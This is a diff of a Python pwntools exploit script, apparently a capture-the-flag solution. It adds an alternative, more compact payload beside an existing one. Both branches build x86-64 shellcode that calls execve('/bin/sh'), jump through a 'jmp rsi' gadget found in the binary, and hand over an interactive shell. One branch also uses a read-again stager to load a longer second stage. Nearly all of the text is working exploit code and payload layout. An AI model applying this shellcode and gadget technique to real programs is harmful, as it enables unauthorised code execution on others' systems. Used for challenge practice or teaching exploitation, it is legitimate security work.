@@ -31,39 +31,59 @@ def conn():
 def main():
     r = conn()
 
-    # We first let the shellcode read again with more space.
-    # We use the existing rdx=0x18 to save buffer room for "jmp rsi""
-    read_again = asm('''
-             sub rsi, 0x18
-             push 0x0
-             pop rax
-             push 0x0
-             pop rdi
-             syscall
-             jmp rsi
-             ''')
-    success(f'The read again shellcode has length {len(read_again)}')
-    # The real execve(/bin/sh) which is 17-bytes
-    bin_sh = next(e.search(b'/bin/sh'))
-    sc = asm(f'''
-             push 0x3b
-             pop rax
-             push {bin_sh}
-             pop rdi
-             push 0x0
-             pop rsi
-             push 0x0
-             pop rdx
-             syscall
-             ''')
-    success(f'The execve(/bin/sh) shellcode has length {len(sc)}')
-    jmp_rsi = next(e.search(asm('jmp rsi')))
-    payload = flat({
-        0: read_again,
-        16: jmp_rsi,
-        24: sc,
-        }, filler=b'\x90')
-    r.sendlineafter(b'/bin/sh', payload)
+    my_solution = True
+    if my_solution:
+        # We first let the shellcode read again with more space.
+        # We use the existing rdx=0x18 to save buffer room for "jmp rsi""
+        read_again = asm('''
+                 sub rsi, 0x18
+                 push 0x0
+                 pop rax
+                 push 0x0
+                 pop rdi
+                 syscall
+                 jmp rsi
+                 ''')
+        success(f'The read again shellcode has length {len(read_again)}')
+        # The real execve(/bin/sh) which is 17-bytes
+        bin_sh = next(e.search(b'/bin/sh'))
+        sc = asm(f'''
+                 push 0x3b
+                 pop rax
+                 push {bin_sh}
+                 pop rdi
+                 push 0x0
+                 pop rsi
+                 push 0x0
+                 pop rdx
+                 syscall
+                 ''')
+        success(f'The execve(/bin/sh) shellcode has length {len(sc)}')
+        jmp_rsi = next(e.search(asm('jmp rsi')))
+        payload = flat({
+            0: read_again,
+            16: jmp_rsi,
+            24: sc,
+            }, filler=b'\x90')
+        r.sendlineafter(b'/bin/sh', payload)
+
+    else:
+        bin_sh = next(e.search(b'/bin/sh'))
+        # Good to know that using lower part of the registers can reduce the instruction size
+        sc = asm(f'''
+                 xor esi, esi
+                 xor edx, edx
+                 mov edi, {bin_sh}
+                 mov al, 0x3b
+                 syscall
+                 ''')
+        success(f'The execve(/bin/sh) shellcode has length {len(sc)}')
+        jmp_rsi = next(e.search(asm('jmp rsi')))
+        payload = flat({
+            0: sc,
+            16: jmp_rsi,
+            }, filler=b'\x90')
+        r.sendlineafter(b'/bin/sh', payload)
 
     r.interactive()
 
